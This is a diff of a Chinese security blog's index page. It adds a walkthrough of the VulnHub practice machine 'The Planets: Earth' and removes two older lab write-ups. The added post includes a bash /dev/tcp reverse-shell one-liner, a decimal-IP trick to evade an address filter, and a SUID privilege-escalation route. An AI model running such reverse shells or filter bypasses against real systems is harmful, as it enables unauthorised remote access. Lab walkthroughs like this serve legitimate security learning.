@@ -191,6 +191,191 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Reigniting">
+      <meta itemprop="description" content="对你表达的东西也好，鼓起勇气面对曾经的自己也罢。 寻觅着你的步伐，从未停下。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种write up">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">靶机The Planets: Earth渗透记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-12-19 14:36:35 / 修改时间：15:39:35" itemprop="dateCreated datePublished" datetime="2021-12-19T14:36:35+08:00">2021-12-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">靶机渗透记录</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>3.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>3 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>前段时间忙于比赛，现在要继续开始学习了，不过又因为期末了所以靶机渗透更新的还是很慢…<br>本人学疏才浅，大佬们轻喷…</p>
+<hr>
+<blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/the-planets-earth,755/">https://www.vulnhub.com/entry/the-planets-earth,755/</a></p>
+</blockquote>
+<hr>
+<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机The Planets: Earth×1  NAT模式<br>渗透机kali 2021.2×1 和靶机在同一网段<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/1.png"></p>
+<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>用arp-scan扫描ip，然后用mac地址确定目标<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/2.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/3.png"><br>扫扫扫</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.155.164</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/4.png"><br>根据nmap扫描的结果可以发现我们是需要加host才能打开那两个网址<br>访问靶机ip也就一个服务开启的默认界面<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/5.png"><br>加上host之后打开</p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/6.png"><br>测试界面，啊我不信<br>另外一个地址打开后是类似一个留言功能的业务<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/7.png"><br>好像没啥漏洞，不过发送记录会展示在页面，发现了三串数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40</span><br><span class="line"></span><br><span class="line">3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45</span><br><span class="line"></span><br><span class="line">2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/10.png"><br>用dirb扫描了一下，发现有个后台<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/8.png"><br>不过需要用户名和密码<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/9.png"><br>另外一个也用dirb扫了一下，发现robots.txt是有东西的<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/11.png"><br>比较可疑的是最后的居然屏蔽的是文件格式，那就试一下吧。<br>发现/testingnotes.txt有提示<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/12.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Testing secure messaging system notes:</span><br><span class="line">*Using XOR encryption as the algorithm, should be safe as used in RSA.</span><br><span class="line">*Earth has confirmed they have received our sent messages.</span><br><span class="line">*testdata.txt was used to test encryption.</span><br><span class="line">*terra used as username for admin portal.</span><br><span class="line">Todo:</span><br><span class="line">*How do we send our monthly keys to Earth securely? Or should we change keys weekly?</span><br><span class="line">*Need to test different key lengths to protect against bruteforce. How long should the key be?</span><br><span class="line">*Need to improve the interface of the messaging interface and the admin panel, it&#x27;s currently very basic.</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/13.png"><br>去访问了一下testdata.txt，发现了几句话。<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/14.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth&#x27;s history, life appeared in the oceans and began to affect Earth&#x27;s atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/15.png"><br>根据提示可以看出来，我们需要解密之前留言板上的密文————用testdata.txt异或解密<br>找在线网站解密一下，拿到了密码<code>earthclimatechangebad4humans</code><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/16.png"><br>登录之后发现了命令行交互，于是决定打个反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.155.128/2333 0&gt;&amp;1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>但是失败了，好像是对ip有限制<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/17.png"><br>于是尝试绕过</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.ipaddressguide.com/ip">https://www.ipaddressguide.com/ip</a></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/3232275328/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/18.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/19.png"><br>拿到了第一个flag<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/20.png"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/21.png"><br>先去看一下/usr/bin/reset_root<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/23.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/22.png"><br>执行失败<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/24.png"><br>是一个可执行的二进制文件，可以利用nc传输到kali攻击机上。<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/25.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ltrace -S ./reset_root</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/26.png"><br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/27.png"><br>可以看到程序运行的时候提示缺少了几个文件<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/28.png"><br>那咋办呢？那就创建一个吧<br>在靶机上创建好后去运行，拿到了root的密码Earth<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/29.png"><br>于是su切换到root用户输入密码<br>进入/root目录，拿到第二个flag<br><img src="/2021/12/19/%E9%9D%B6%E6%9C%BAThe-Planets-Earth%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/30.png"><br>至此，渗透结束。</p>
+<hr>
+<blockquote>
+<p>暮晓春来迟，先于百花知。岁岁种桃花，开在断肠时。</p>
+</blockquote>
+<hr>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Reigniting">
+      <meta itemprop="description" content="对你表达的东西也好，鼓起勇气面对曾经的自己也罢。 寻觅着你的步伐，从未停下。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="各种write up">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2021/12/01/%E9%9D%B6%E6%9C%BAHemisphere-Gemini%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">靶机Hemisphere-Gemini渗透记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-01 09:15:30" itemprop="dateCreated datePublished" datetime="2021-12-01T09:15:30+08:00">2021-12-01</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>0</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2021/09/02/%E9%9D%B6%E6%9C%BAcovfefe-1%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -656,214 +841,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/31/hacksudo-aliens/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Reigniting">
-      <meta itemprop="description" content="对你表达的东西也好，鼓起勇气面对曾经的自己也罢。 寻觅着你的步伐，从未停下。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="各种write up">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/31/hacksudo-aliens/" class="post-title-link" itemprop="url">靶机hacksudo: aliens渗透记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-07-31 01:17:32" itemprop="dateCreated datePublished" datetime="2021-07-31T01:17:32+08:00">2021-07-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-08-08 11:29:38" itemprop="dateModified" datetime="2021-08-08T11:29:38+08:00">2021-08-08</time>
-              </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>700</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>很适合初学者的靶机，来尝试一下。</p>
-<blockquote>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/hacksudo-aliens,676/">https://www.vulnhub.com/entry/hacksudo-aliens,676/</a></p>
-</blockquote>
-<hr>
-<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机hacksudo: aliens×1<br>渗透机Kali Linux2021.2×1  和靶机在同一网段</p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机<br><img src="/2021/07/31/hacksudo-aliens/1.png"><br>确定靶机mac地址<br><img src="/2021/07/31/hacksudo-aliens/2.png"><br>扫描内网</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/31/hacksudo-aliens/3.png"><br>判断靶机ip之后用nmap进行信息探测</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.131</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/31/hacksudo-aliens/4.png"><br>web服务开着，去看一下<br><img src="/2021/07/31/hacksudo-aliens/5.png"><br>随意点了点，没找到什么东西，用dirb扫一下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.55.131/</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/31/hacksudo-aliens/6.png"><br>发现有个/backup目录，去看一眼。<br><img src="/2021/07/31/hacksudo-aliens/7.png"><br>里面有个数据库备份文件，打开获得密码。<br><img src="/2021/07/31/hacksudo-aliens/8.png"><br>namap探测到还有一个网页，是phpMyAdmin后台登录界面。<br><img src="/2021/07/31/hacksudo-aliens/9.png"><br>把刚才收集到的账号密码输进去。<br><img src="/2021/07/31/hacksudo-aliens/10.png"><br>找到用户表，虽然密码都是加密过的，不过加密后的密文里发现root用户和我们是一样的，换成root登录进去。</p>
-<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p><img src="/2021/07/31/hacksudo-aliens/11.png"><br>查看文件写入权限<code>secure_file_priv</code>，如果参数为空，就可以任意写入<br>这里可以看到，是空的。<br><img src="/2021/07/31/hacksudo-aliens/12.png"><br>写入一句话。<br><img src="/2021/07/31/hacksudo-aliens/13.png"><br>蚁剑链接。<br><img src="/2021/07/31/hacksudo-aliens/14.png"><br>配合kali打一波nc反弹shell<br>链接成功之后尝试提权。<br><img src="/2021/07/31/hacksudo-aliens/15.png"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找suid权限文件。<br><img src="/2021/07/31/hacksudo-aliens/16.png"></p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
-</blockquote>
-<p>查找了一番，date程序可以用于提权。<br>成功读取/etc/shadow<br><img src="/2021/07/31/hacksudo-aliens/17.png"><br><img src="/2021/07/31/hacksudo-aliens/18.png"><br>找到了hacksudo的密文，使用工具john进行破解。<br><img src="/2021/07/31/hacksudo-aliens/19.png"><br>切换到用户hacksudo。<br><img src="/2021/07/31/hacksudo-aliens/20.png"><br>跟刚才一样，查找suid权限文件。<br><img src="/2021/07/31/hacksudo-aliens/21.png"><br>发现cpulimit程序可用于提权。<br><img src="/2021/07/31/hacksudo-aliens/22.png"><br>参考网站进行提权。<br><img src="/2021/07/31/hacksudo-aliens/23.png"><br>提权成功。进入/root即可读取flag</p>
-<hr>
-<blockquote>
-<p>相识虽浅，似是经年。静守时光，以待流年。</p>
-</blockquote>
-<hr>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/22/Cheesey-Cheeseyjack/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Reigniting">
-      <meta itemprop="description" content="对你表达的东西也好，鼓起勇气面对曾经的自己也罢。 寻觅着你的步伐，从未停下。">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="各种write up">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/07/22/Cheesey-Cheeseyjack/" class="post-title-link" itemprop="url">靶机Cheesey:Cheeseyjack渗透记录</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-07-22 16:18:12" itemprop="dateCreated datePublished" datetime="2021-07-22T16:18:12+08:00">2021-07-22</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-08-03 17:56:44" itemprop="dateModified" datetime="2021-08-03T17:56:44+08:00">2021-08-03</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">靶机渗透记录</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="本文字数">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">本文字数：</span>
-              <span>1.9k</span>
-            </span>
-            <span class="post-meta-item" title="阅读时长">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>2 分钟</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>本来懒得写，但是写完搜了一下发现这个靶机的笔记比较少，就发出来供大家参考。<br>本人巨菜，轻喷。</p>
-<hr>
-<blockquote>
-<p>下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/cheesey-cheeseyjack,578/">https://www.vulnhub.com/entry/cheesey-cheeseyjack,578/</a></p>
-</blockquote>
-<hr>
-<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>靶机Cheesey: Cheeseyjack×1<br>渗透机kali 2021.2×1 和靶机在同一网段</p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>打开靶机，看一下mac地址。<br><img src="/2021/07/22/Cheesey-Cheeseyjack/1.png"><br>扫描内网，根据mac地址判断渗透靶机的ip。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/2.png"><br>nmap信息探测。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV -A -Pn -n -p- 192.168.55.134</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/07/22/Cheesey-Cheeseyjack/3.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/4.png"><br><img src="/2021/07/22/Cheesey-Cheeseyjack/5.png"></p>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2021/07/22/Cheesey-Cheeseyjack/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -935,7 +912,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">18</span>
+          <span class="site-state-item-count">20</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -984,12 +961,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">22k</span>
+    <span title="站点总字数">25k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">20 分钟</span>
+    <span title="站点阅读时长">23 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
   </div>
